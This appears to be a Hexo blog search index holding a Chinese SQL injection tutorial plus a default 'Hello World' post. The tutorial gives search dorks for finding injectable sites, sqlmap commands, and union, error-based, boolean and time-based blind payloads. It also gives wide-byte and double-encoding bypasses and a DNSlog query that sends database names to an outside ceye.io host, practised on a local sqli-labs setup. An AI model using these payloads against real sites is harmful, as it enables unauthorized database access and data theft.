<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>sql注入详细教程-持续更新</title>
      <link href="2021/04/05/sql-inject/"/>
      <url>2021/04/05/sql-inject/</url>
      
        <content type="html"><![CDATA[<h1 id="SQL-注入"><a href="#SQL-注入" class="headerlink" title="SQL 注入"></a>SQL 注入</h1><h2 id="寻找-SQL-注入点"><a href="#寻找-SQL-注入点" class="headerlink" title="寻找 SQL 注入点"></a>寻找 SQL 注入点</h2><h3 id="目标搜集"><a href="#目标搜集" class="headerlink" title="目标搜集"></a>目标搜集</h3><h4 id="无特定目标"><a href="#无特定目标" class="headerlink" title="无特定目标"></a>无特定目标</h4><ul><li>inurl:php?id=</li></ul><h4 id="有特定目标"><a href="#有特定目标" class="headerlink" title="有特定目标"></a>有特定目标</h4><ul><li>inurl:php?id= site:target.com</li></ul><h4 id="工具爬取"><a href="#工具爬取" class="headerlink" title="工具爬取"></a>工具爬取</h4><ul><li>spider，对搜索引擎和目标网站的连接进行爬取</li></ul><h3 id="注入识别"><a href="#注入识别" class="headerlink" title="注入识别"></a>注入识别</h3><h4 id="手工简单识别"><a href="#手工简单识别" class="headerlink" title="手工简单识别"></a>手工简单识别</h4><ul><li><p>and 1=1 / and 1=2</p></li><li><p>and ‘1’=’1 / and ‘1’=’2</p></li><li><p>and 1 like 1 / and 1 like 2</p></li></ul><h4 id="工具识别"><a href="#工具识别" class="headerlink" title="工具识别"></a>工具识别</h4><p>sqlmap -m filename (filename 中保存检测目标)</p><p>sqlmap –crawl (sqlmap 对目标网站进行爬取，然后依次进行测试)</p><h4 id="高级识别"><a href="#高级识别" class="headerlink" title="高级识别"></a>高级识别</h4><p>拓展广度和深度</p><ul><li><p>sqlmap –level 增加测试级别（1-5），对 head 中的相关参数也进行测试</p></li><li><p>sqlmap -r filename （file 中为网站请求数据）</p></li></ul><p>利用工具提高识别效率</p><ul><li><p>burpsuite+sqlmap</p></li><li><p>burpsuite 拦截所有浏览器访问提交的数据</p></li><li><p>burpsuite 扩展插件，直接调用 sqlmap 进行测试（插件-SQLiPy Sqlmap Intergration || 也可以自己写插件）</p></li></ul><p>一些 Tips:</p><ul><li><p>可以在参数后键入“*”来确定想要测试的参数</p></li><li><p>可能出现注入的点：新闻、登陆、留言</p></li><li><p>站在开发的角度去寻找</p></li></ul><h4 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h4><ul><li><p>搜索关键代码和函数</p></li><li><p>梳理业务流程</p></li></ul><p>例子：强网杯 WEB”python is the best language”</p><h2 id="SQL-注入流程"><a href="#SQL-注入流程" class="headerlink" title="SQL 注入流程"></a>SQL 注入流程</h2><h3 id="流程导图"><a href="#流程导图" class="headerlink" title="流程导图"></a>流程导图</h3><p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/Sql%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B.png"></p><h4 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h4><p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86.png"></p><h4 id="数据获取"><a href="#数据获取" class="headerlink" title="数据获取"></a>数据获取</h4><p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE.png"></p><h5 id="手工查询"><a href="#手工查询" class="headerlink" title="手工查询"></a>手工查询</h5><ul><li><p>查库</p><pre class="line-numbers language-none"><code class="language-none">select schema_name from information_schema.schemata<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>查表</p><pre class="line-numbers language-none"><code class="language-none">select table_name from information_schema.tables where table_schema=库名 \ 0x库名 \ database()<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>查列</p><pre class="line-numbers language-none"><code class="language-none">select column_name from information_scheme.columns where table_name=表名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>查数据</p><pre class="line-numbers language-none"><code class="language-none">select 列名 from 库名.表名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><h5 id="提示"><a href="#提示" class="headerlink" title="提示"></a>提示</h5><ol><li>所有的 Sql 注入，都是基于查库、表、列语句</li><li>如果数据太多导致无法查询结果<br>查询的场景：可利用 limit 限定返回的数量及位置，依次查询<br>回显数据的场景：concat() ,group_concat(),concat_ws()+limit</li><li>在一些场景，想要快速获取数据，需借助工具，如：BurpSuite</li></ol><h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/%E6%8F%90%E6%9D%83.png"></p><h3 id="SQL-注入分类"><a href="#SQL-注入分类" class="headerlink" title="SQL 注入分类"></a>SQL 注入分类</h3><h4 id="UNION-联合查询注入"><a href="#UNION-联合查询注入" class="headerlink" title="UNION 联合查询注入"></a>UNION 联合查询注入</h4><blockquote><p>UNION 操作符用于合并两个或多个 SELECT 语句的结果集</p></blockquote><p><strong>注意：</strong></p><ul><li><p>UNION 内部的 SELECT 语句必须拥有相同数量的列。</p></li><li><p>列也必须拥有相似的数据类型。</p></li><li><p>同时每条 SELECT 语句中的列的顺序必须相同。</p></li><li><p>默认情况下，UNION 操作符选取不同的值。如果允许重复的值，则使用 UNION ALL。</p></li></ul><h5 id="UNION-注入应用场景"><a href="#UNION-注入应用场景" class="headerlink" title="UNION 注入应用场景"></a>UNION 注入应用场景</h5><ul><li>只有最后一个 SELECT 子句允许有 ORDER BY；</li><li>只有最后一个 SELECT 子句允许有 LIMIT；</li><li>只要 UNION 连接的几个查询的字段数一样且列的数据类型转换没有问题，就可以查询出结果；</li><li>注入点页面有回显；</li></ul><h5 id="UNION-注入过程"><a href="#UNION-注入过程" class="headerlink" title="UNION 注入过程"></a>UNION 注入过程</h5><blockquote><p>ORDER BY 猜出来的列数超过数据库表中的列数，报错并不能返回出数据</p></blockquote><ol><li>ORDER BY 确定列数</li><li>观察页面返回，选取可以显示数据的位置，进行下一步的注入</li><li>读库信息</li><li>读表信息</li><li>读字段</li><li>读数据</li></ol><h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><blockquote><p>构造 payload 让信息通过错误提示回显出来</p></blockquote><h5 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h5><p>查询不回现内容，会打印错误信息</p><p>Update、insert 等语句，会打印错误信息</p><h5 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h5><p>凡是能够让错误信息显示的函数（语句），都能实现报错注入，以下列举 3 种。</p><ul><li>foor()</li></ul><pre class="line-numbers language-none"><code class="language-none">select count(*) from information_schema.tables group by concat((select version()),floor(rand(0)*2))//concat:连接字符串功能//floor:取flout的整数值//rand:取0~1之间的随机浮点值//group by:根据一个或多个列对结果集进行分组并有排序功能<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>extractvalue()</li></ul><pre class="line-numbers language-none"><code class="language-none">select extractvalue(1,concat(0x7e,(select user()),0x7e))//去掉select也可以extractvalue(1,concat(0x7e,(user()),0x7e))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li>updatexml()</li></ul><pre class="line-numbers language-none"><code class="language-none">select updatexml(1,concat(0x7e,(select user()),0x7e),1)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h4><h5 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h5><h6 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h6><blockquote><p>构造语句来判断数据库信息的正确性，再通过页面的‘真’和‘假’（状态）来识别我们的判断是否正确。</p><p>举个猜单词的例子：“good”，第一位我猜是‘’a‘’，页面返回假，但是我猜‘g’，页面就返回真。然后依次猜后面的字母。</p></blockquote><h6 id="布尔盲注的方法"><a href="#布尔盲注的方法" class="headerlink" title="布尔盲注的方法"></a>布尔盲注的方法</h6><blockquote><p>构造逻辑判断语句，判断信息的真假，取出所有的真值，实现 SQL 注入</p></blockquote><table><thead><tr><th align="center">序号</th><th align="center">方法</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">1</td><td align="center">left()函数</td><td align="center">left(database(),1)&gt;’s’ //判断 database()的前一位是否大于’s’<br>database()显示数据库名称，left(a,b)从左侧截取 a 的前 b 位</td></tr><tr><td align="center">2</td><td align="center">regexp</td><td align="center">select user() regexp ‘^r’ //判断 user()的头位置是否为’r’<br>正则表达式的用法，user()结果为 root,regexp 为匹配 root 的正则表达式</td></tr><tr><td align="center">3</td><td align="center">like</td><td align="center">select user() like ‘ro%’<br>与 regexp 类似，使用 like 进行匹配</td></tr><tr><td align="center">4</td><td align="center">substr()函数<br>ascii()函数</td><td align="center">ascii(substr((select database()),1,1))≠98<br>substr(a,b,c)从 b 位置开始，截取字符串 a 的 c 长度，ascii()将字符转换为 ascii 值</td></tr><tr><td align="center">5</td><td align="center">ord()函数<br>mid()函数</td><td align="center">ord(mid((select user()),1,1))=114<br>mid(a,b,c)从位置 b 开始，截取 a 字符串的 c 位 ord()函数通 ascii，将字符转为 ascii 值</td></tr></tbody></table><h5 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h5><h6 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h6><blockquote><p>代码存在 SQL 注入漏洞，然而页面不会回显数据，也不会回显错误信息；</p><p>语句执行后也不知道真假，我们不能通过页面返回的内容来进行判断；</p><p>可以构造语句，通过页面响应的市场，来判断信息，这就是时间盲注</p></blockquote><h6 id="时间盲注的方法"><a href="#时间盲注的方法" class="headerlink" title="时间盲注的方法"></a>时间盲注的方法</h6><blockquote><p>构造逻辑语句，通过条件语句进行判断，为真立刻执行，否则延时执行</p></blockquote><table><thead><tr><th align="center">核心语法</th><th align="center">真实场景</th></tr></thead><tbody><tr><td align="center">if(left(user(),1)=’a’,0,sleep(3))</td><td align="center">if(ascii(substr(user(),1,1))&gt;115,0,sleep(2))%23</td></tr></tbody></table><h5 id="Dnslog-盲注"><a href="#Dnslog-盲注" class="headerlink" title="Dnslog 盲注"></a>Dnslog 盲注</h5><blockquote><p>代码存在 SQL 注入漏洞，然而页面既不会回显数据，也不会显示错误显示；</p><p>我们通过布尔或者时间盲注可以获取到内容，但是整个过程效率较低，需要发送很多的请求进行判断，很肯能会出发安全设备的防护；</p><p>我们需要一种方式，减少请求 ，直接回显数据，这里可以使用 Dnslog 实现注入。</p><p>Dnslog 平台：<a href="http://ceye.io/">http://ceye.io</a></p></blockquote><h6 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h6><p>DNS 在解析的时候回留下日志 ，通过读取多级域名的解析日志，获取请求信息。</p><p>MySql LOAD_FILE 函数可以发起请求：</p><p>SELECT LOAD_FILE(CONCAT(‘\\‘,’test’,’.mysql.6pd3g5.ceye.io\abc’));</p><h6 id="Dnslog-盲注方法"><a href="#Dnslog-盲注方法" class="headerlink" title="Dnslog 盲注方法"></a>Dnslog 盲注方法</h6><p>构造语句，利用 load_file()函数发起请求，使用 Dnslog 接收请求，获取数据</p><p>Tips：目标服务器必须是 Windows，应为 LOAD_FILE 函数不能运行在 Linux 下。</p><p>通过 SQL 语句查询内容，作为请求的一部分，发送至 Dnslog;</p><p>只要对这一部分的语句进行构造，就能实现有回显的 SQL 注入;</p><p>值得注意的是，这些数据格式和内容队友限制（:,~,@），需要进行一些处理。</p><pre class="line-numbers language-none"><code class="language-none">#sqlilabs环境下：http://127.0.0.1/sqlilabs/Less-1/?id=1' and if((SELECT LOAD_FILE(CONCAT('\\\\',(select database()),'.6pd3g5.ceye.io\\abc'))),1,1)--+#navicat环境下：SELECT LOAD_FILE(CONCAT('\\\\',(select database()),'.6pd3g5.ceye.io\\abc'));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h4><p>字符大小为一个字节就为窄字节</p><p>字符大小为两个字节就位宽字节</p><p>宽字节：GB2312、GBK、GB18030、BIG5、Shift_JIS 等这些都是常说的宽字节，实际为两字节。</p><h5 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h5><p>使用 UTF-8，避免宽字节注入；</p><ol><li>ps：不仅在 gbk、韩文、日文等等都是宽字节，都有可能存在宽字节注入漏洞</li><li>mysql_real_escape_string,mysql_set_charset(‘gbk’,$conn)；</li><li>可以设置参数，character_set_client=binary,<br>例如$result=mysql_query(“character_set_client=binary”,$sql)；</li></ol><h5 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h5><pre class="line-numbers language-none"><code class="language-none">输入    处理     编码      带入SQL '    \'      %5c%27 \'   id=1\' and    &gt;&gt;不能注入 //MySQL在使用GBK编码的时候，会认为两个字符为一个函数 %df    %df\'   %df%5c%27 啊'   id=啊' and  &gt;&gt;可以注入 两个字符组合，认为是一个汉字 注：前一个ASCII码大于128才能到汉字的范围<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="方法-1"><a href="#方法-1" class="headerlink" title="方法"></a>方法</h5><p>在注入点后键入%df，然后按照正常的流程开始注入</p><p>sqlilabs-less-32（测试环境）</p><h5 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h5><h6 id="手工"><a href="#手工" class="headerlink" title="手工"></a>手工</h6><pre class="line-numbers language-none"><code class="language-none">//黑盒测试在可能的注入点后键入%df，之后进行注入测试//白盒测试1.查看MySQL编码是否为GBK2.是否使用preg_replace把单引号替换成\'3.是否使用addslashes进行转义4.是否使用mysql_real_escape_string进行转义<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h6 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h6><pre class="line-numbers language-none"><code class="language-none">//在参数id=1后加%dfpython sqlmap.py -u http://localhost/sqlilabs/Less-32/?id=1%df<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="二次编码注入"><a href="#二次编码注入" class="headerlink" title="二次编码注入"></a>二次编码注入</h4><p>为什么要编码？</p><p>e.g.</p><p>?id=1&amp;username=admin&amp;passwd=admin</p><p>假如用户的 username 中存在&amp;、？就会和 URL 冲突</p><blockquote><p>宽字节注入和二次注入都是在面对 PHP 代码或配置，对输入的’(单引号)进行转义的时候，在处理用户输入数据是存在问题，可绕过转义。</p></blockquote><h5 id="原理-4"><a href="#原理-4" class="headerlink" title="原理"></a>原理</h5><p>urlencode()与 PHP 本身编码时，两者配合失误，构造数据消灭\</p><pre class="line-numbers language-none"><code class="language-none">用户输入PHP自身编码   转义   带入SQLid=1%27      id=1'      id=1\'     id=1\' and  &lt;&lt;不能注入用户输入     PHP自身编码   转义     函数编码   带入SQLid=1%2527   id=1%27    id=1%27    id=1'    id=1' and    &lt;&lt;可以注入<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="注入-1"><a href="#注入-1" class="headerlink" title="注入"></a>注入</h5><h6 id="手工-1"><a href="#手工-1" class="headerlink" title="手工"></a>手工</h6><pre class="line-numbers language-none"><code class="language-none">//黑盒测试在可能的注入点后键入%2527，之后进行注入测试?id=1%2527//白盒测试1.是否使用户urldecode2.urldecode函数是否在转义的方法之后<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h6 id="sqlmap-1"><a href="#sqlmap-1" class="headerlink" title="sqlmap"></a>sqlmap</h6><p>python sqlmap.py -u <a href="http://localhost/sqlilabs/Less-32/?id=1%2527">http://localhost/sqlilabs/Less-32/?id=1%2527</a></p><h4 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h4><h5 id="原理-5"><a href="#原理-5" class="headerlink" title="原理"></a>原理</h5><ol><li><p>插入恶意数据</p><blockquote><p>第一次进行数据库插入数据的时候，仅仅对其中的特殊字符进行了转义，在写入数据库的时候还保留了原来的数据，但是数据本身包含恶意内容。</p></blockquote></li><li><p>引用恶意数据</p><blockquote><p>在将数据存入到数据库之后，开发者就认为数据是可信的。在下一次需要进行查询的时候，直接从数据库中取出了恶意数据，没有进行进一步的检验和处理，这样就会造成 SQL 的二次注入。</p></blockquote></li></ol><p>示意图</p><p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%9B%BE.png"></p><p>练习</p><p>sqlilabs-less-24</p><h5 id="防御-1"><a href="#防御-1" class="headerlink" title="防御"></a>防御</h5><blockquote><p>对外部提交的数据，需要更加谨慎的对待。</p><p>程序内部的数据调用，也要更严格的进行检查，一旦不小心，测试者就能将特定的 SQL 语句带入到查询当中。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
            <tag> 哈哈 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="2021/04/04/hello-world/"/>
      <url>2021/04/04/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo new <span class="token string">"My New Post"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo server<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo generate<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo deploy<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
